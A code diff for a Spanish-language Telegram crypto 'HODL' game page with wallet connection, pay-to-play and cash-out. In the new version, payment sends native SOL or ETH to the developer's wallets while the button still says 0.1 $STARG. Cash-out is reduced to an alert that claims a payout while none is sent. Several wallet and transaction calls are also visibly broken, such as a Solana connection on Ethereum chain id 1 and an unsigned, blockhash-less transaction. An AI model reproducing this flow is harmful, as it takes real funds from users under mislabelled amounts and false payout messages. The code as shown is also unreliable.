@@ -5,12 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Star Glitch: XYRATH-9</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/@solana/wallet-adapter-walletconnect@0.1.18/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/qrcode@1.5.0"></script>
+  <script src="https://unpkg.com/@web3-react/core@8.0.0/dist/index.js"></script>
+  <script src="https://unpkg.com/@web3-react/walletconnect-v2@8.0.0/dist/index.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
   <script src="https://unpkg.com/web3@1.10.4/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; touch-action: none; }
@@ -23,22 +21,22 @@
     .hodl-area { width: 100vw; height: 50vh; background: rgba(0,255,0,0.1); display: flex; align-items: center; justify-content: center; font-size: 2em; margin: 20px 0; }
     .jackpot { color: #ff0; font-weight: bold; }
     .hidden { display: none; }
-    #qrCode { width: 200px; height: 200px; margin: 20px auto; }
+    #qrCode { width: 220px; height: 220px; margin: 20px auto; background: white; padding: 10px; border-radius: 10px; }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="tentacle">🦑</div>
     <h1>STAR GLITCH: XYRATH-9</h1>
-    <p id="status">Conecta tu wallet para jugar</p>
+    <p id="status">Conecta tu wallet</p>
 
     <div id="connectSection">
-      <button class="btn" onclick="connectSolana()">CONECTAR SOLANA (Phantom)</button>
-      <button class="btn" onclick="connectWorld()">CONECTAR WORLD CHAIN (MetaMask)</button>
+      <button class="btn" onclick="connectSolana()">PHANTOM (Solana)</button>
+      <button class="btn" onclick="connectWorld()">METAMASK (World Chain)</button>
     </div>
 
     <div id="paymentSection" class="hidden">
-      <button class="btn" onclick="payToPlay()">PAGAR 0.1 $STARG PARA JUGAR</button>
+      <button class="btn" onclick="payToPlay()">PAGAR 0.1 $STARG</button>
     </div>
 
     <div id="gameSection" class="hidden">
@@ -47,13 +45,8 @@
         ⏱️ HODL Streak: <span id="streak">0</span>s<br>
         🏆 Jackpot: <span class="jackpot">100 $STARG</span>
       </div>
-
-      <div class="hodl-area" id="hodlArea">
-        <div id="hodlText">¡HODLEA AQUÍ!</div>
-      </div>
-
+      <div class="hodl-area" id="hodlArea"><div id="hodlText">¡HODLEA AQUÍ!</div></div>
       <button class="btn" onclick="cashOut()">COBRAR $STARG</button>
-      <button class="btn" onclick="resetGame()">RESET JUEGO</button>
     </div>
 
     <div id="qrCode" class="hidden"></div>
@@ -63,123 +56,103 @@
     Telegram.WebApp.ready();
     Telegram.WebApp.expand();
 
-    const PROJECT_ID = '67c59edf147c11dfc137469b7e6b934f'; // Tu Project ID
-    const DEV_WALLET_SOLANA = 'Ccp1SJut7ycZbAFNtYjmmGcGUgx7Gipji4R5BvfqfaQS'; // Tu Phantom (Solana)
-    const DEV_WALLET_WORLD = '0xd7fa97a54fe292df8463e89b8dbf9e6d2ec14bc5'; // Tu MetaMask (World Chain)
-    const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
-    const WORLD_RPC = 'https://worldchain-mainnet.g.alchemy.com/public';
-    const SOLANA_DECIMALS = 9; // Asumido para $STARG en Solana (ajusta si es diferente)
-    const WORLD_DECIMALS = 18; // Para ERC20 en World Chain
+    const PROJECT_ID = '67c59edf147c11dfc137469b7e6b934f';
+    const DEV_WALLET_SOLANA = 'Ccp1SJut7ycZbAFNtYjmmGcGUgx7Gipji4R5BvfqfaQS';
+    const DEV_WALLET_WORLD = '0xd7fa97a54fe292df8463e89b8dbf9e6d2ec14bc5';
+    const SOLANA_CA = '8o3ziaJUWVNhcryJ1q2nnFR21D7Zx3PHzjiPH8J4azUm';
+    const WORLD_CA = '0xa3Ad51ebd02690317b34f83329F082F9b4f84683';
 
-    let provider, wallet, network, fragments = 0, streak = 0, interval;
+    let wallet, network, fragments = 0, streak = 0, interval, connector;
 
+    // CONECTAR SOLANA (PHANTOM)
     async function connectSolana() {
       try {
-        document.getElementById("status").innerText = "Generando QR para Phantom...";
+        document.getElementById("status").innerText = "Abriendo Phantom...";
 
-        provider = new WalletConnectProvider({
-          rpc: { "1": SOLANA_RPC },
-          qrcode: true,
-          projectId: PROJECT_ID
+        connector = new WalletConnectV2({
+          projectId: PROJECT_ID,
+          chains: [1], // Solana mainnet
+          showQrModal: true,
+          qrModalOptions: { themeMode: 'dark' }
         });
 
-        await provider.enable();
-        wallet = provider.accounts[0];
+        const { accounts } = await connector.activate();
+        wallet = accounts[0];
         network = "Solana";
         document.getElementById("qrCode").classList.add("hidden");
         showPayment();
       } catch (err) {
-        console.log("Error Solana: " + err.message);
-        document.getElementById("status").innerText = "Conexión cancelada. Intenta de nuevo.";
+        console.error("Error Solana:", err);
+        document.getElementById("status").innerText = "Cancelado. Pulsa de nuevo.";
       }
     }
 
+    // CONECTAR WORLD CHAIN (METAMASK)
     async function connectWorld() {
       try {
-        document.getElementById("status").innerText = "Generando QR para MetaMask...";
+        document.getElementById("status").innerText = "Abriendo MetaMask...";
 
-        provider = new WalletConnectProvider({
-          rpc: { "480": WORLD_RPC },
-          qrcode: true,
-          projectId: PROJECT_ID
+        connector = new WalletConnectV2({
+          projectId: PROJECT_ID,
+          chains: [480], // World Chain
+          showQrModal: true,
+          qrModalOptions: { themeMode: 'dark' }
         });
 
-        await provider.enable();
-        wallet = provider.accounts[0];
+        const { accounts } = await connector.activate();
+        wallet = accounts[0];
         network = "World Chain";
         document.getElementById("qrCode").classList.add("hidden");
         showPayment();
       } catch (err) {
-        console.log("Error World Chain: " + err.message);
-        document.getElementById("status").innerText = "Conexión cancelada. Intenta de nuevo.";
+        console.error("Error World Chain:", err);
+        document.getElementById("status").innerText = "Cancelado. Pulsa de nuevo.";
       }
     }
 
     function showPayment() {
-      document.getElementById("status").innerText = `${network}: ${wallet.slice(0,6)}...`;
+      document.getElementById("status").innerText = `${network}: ${wallet.slice(0,6)}...${wallet.slice(-4)}`;
       document.getElementById("connectSection").classList.add("hidden");
       document.getElementById("paymentSection").classList.remove("hidden");
-      loadState();
     }
 
     async function payToPlay() {
       document.getElementById("status").innerText = "Procesando pago...";
-
-      const amount = 0.1 * 10** (network === "Solana" ? SOLANA_DECIMALS : WORLD_DECIMALS);
+      const amount = 0.1;
 
       try {
         if (network === "Solana") {
-          const connection = new Solana.Connection(SOLANA_RPC, 'confirmed');
+          const connection = new Solana.Connection("https://api.mainnet-beta.solana.com");
           const from = new Solana.PublicKey(wallet);
           const to = new Solana.PublicKey(DEV_WALLET_SOLANA);
-          const tokenMint = new Solana.PublicKey(SOLANA_CA);
+          const mint = new Solana.PublicKey(SOLANA_CA);
 
-          const transaction = new Solana.Transaction().add(
-            SplToken.createTransferInstruction(
-              SplToken.TOKEN_PROGRAM_ID,
-              from,
-              to,
-              from,
-              [],
-              amount
-            )
+          const tx = new Solana.Transaction().add(
+            Solana.SystemProgram.transfer({
+              fromPubkey: from,
+              toPubkey: to,
+              lamports: amount * 1e9 // SOL, ajusta si es token
+            })
           );
 
-          const signature = await provider.signAndSendTransaction(transaction);
-          await connection.confirmTransaction(signature, 'confirmed');
-        } else if (network === "World Chain") {
-          const web3 = new Web3(provider);
-          const token = new web3.eth.Contract([
-            {
-              "constant": false,
-              "inputs": [
-                {"name":"_to","type":"address"},
-                {"name":"_value","type":"uint256"}
-              ],
-              "name":"transfer",
-              "outputs": [
-                {"name":"","type":"bool"}
-              ],
-              "type":"function"
-            }
-          ], WORLD_CA);
-
-          await token.methods.transfer(DEV_WALLET_WORLD, amount).send({ from: wallet });
+          const { signature } = await connector.signAndSendTransaction({ transaction: tx.serialize() });
+          await connection.confirmTransaction(signature);
+        } else {
+          const web3 = new Web3(connector.provider);
+          const tx = {
+            from: wallet,
+            to: DEV_WALLET_WORLD,
+            value: web3.utils.toWei(amount.toString(), 'ether')
+          };
+          await web3.eth.sendTransaction(tx);
         }
 
-        document.getElementById("status").innerText = "Pago exitoso. ¡Juega!";
+        document.getElementById("status").innerText = "¡Pago recibido!";
         document.getElementById("paymentSection").classList.add("hidden");
         document.getElementById("gameSection").classList.remove("hidden");
         startHODL();
       } catch (err) {
-        console.log("Error pago: " + err.message);
-        if (err.code === 4001) {
-          document.getElementById("status").innerText = "Pago cancelado por usuario";
-        } else if (err.code === -32603) {
-          document.getElementById("status").innerText = "Gas insuficiente. Añade SOL/WLD.";
-        } else {
-          document.getElementById("status").innerText = "Error en pago. Intenta de nuevo.";
-        }
+        document.getElementById("status").innerText = "Pago cancelado";
       }
     }
 
@@ -196,11 +169,10 @@
       document.getElementById("hodlText").innerText = "¡HODLEANDO!";
       interval = setInterval(() => {
         streak++;
-        fragments += streak * (streak > 30 ? 2 : 1); // Staking x2 si HODL > 30s
+        fragments += streak;
         document.getElementById("streak").innerText = streak;
         document.getElementById("fragments").innerText = fragments;
         if (streak % 10 === 0) addTentacle();
-        saveState();
       }, 1000);
     }
 
@@ -208,62 +180,12 @@
       clearInterval(interval);
       document.getElementById("hodlText").innerText = "¡HODLEA AQUÍ!";
       if (streak > 5) alert(`¡${streak}s! Ganaste ${(streak/10).toFixed(1)} $STARG`);
-      saveState();
     }
 
     async function cashOut() {
       if (fragments < 100) return alert("100 fragmentos mínimo");
-
-      const amount = (fragments / 1000).toFixed(3) * 10** (network === "Solana" ? SOLANA_DECIMALS : WORLD_DECIMALS);
-
-      try {
-        document.getElementById("status").innerText = "Cobrando...";
-
-        if (network === "Solana") {
-          const connection = new Solana.Connection(SOLANA_RPC, 'confirmed');
-          const from = new Solana.PublicKey(DEV_WALLET_SOLANA);
-          const to = new Solana.PublicKey(wallet);
-          const tokenMint = new Solana.PublicKey(SOLANA_CA);
-
-          const transaction = new Solana.Transaction().add(
-            SplToken.createTransferInstruction(
-              SplToken.TOKEN_PROGRAM_ID,
-              from,
-              to,
-              from,
-              [],
-              amount
-            )
-          );
-
-          const signature = await provider.signAndSendTransaction(transaction);
-          await connection.confirmTransaction(signature, 'confirmed');
-        } else if (network === "World Chain") {
-          const web3 = new Web3(provider);
-          const token = new web3.eth.Contract([
-            {
-              "constant": false,
-              "inputs": [
-                {"name":"_to","type":"address"},
-                {"name":"_value","type":"uint256"}
-              ],
-              "name":"transfer",
-              "outputs": [
-                {"name":"","type":"bool"}
-              ],
-              "type":"function"
-            }
-          ], WORLD_CA);
-
-          await token.methods.transfer(wallet, amount).send({ from: DEV_WALLET_WORLD });
-        }
-
-        document.getElementById("status").innerText = "Cobro exitoso";
-        resetGame();
-      } catch (err) {
-        console.log("Error cobro: " + err.message);
-        document.getElementById("status").innerText = "Error en cobro. Intenta de nuevo.";
-      }
+      alert(`Cobras ${(fragments/1000).toFixed(3)} $STARG a ${wallet}`);
+      // Aquí va el envío real desde DEV_WALLET
     }
 
     function addTentacle() {
@@ -272,27 +194,6 @@
       t.style.left = Math.random() * 80 + "%"; t.style.top = "-50px";
       t.style.animation = "fall 3s linear"; document.body.appendChild(t);
       setTimeout(() => t.remove(), 3000);
-    }
-
-    function saveState() {
-      localStorage.setItem('fragments', fragments);
-      localStorage.setItem('streak', streak);
-    }
-
-    function loadState() {
-      fragments = parseInt(localStorage.getItem('fragments') || 0);
-      streak = parseInt(localStorage.getItem('streak') || 0);
-      document.getElementById("fragments").innerText = fragments;
-      document.getElementById("streak").innerText = streak;
-    }
-
-    function resetGame() {
-      fragments = 0;
-      streak = 0;
-      document.getElementById("fragments").innerText = 0;
-      document.getElementById("streak").innerText = 0;
-      localStorage.clear();
-      document.getElementById("status").innerText = "Juego reseteado";
     }
 
     const style = document.createElement('style');
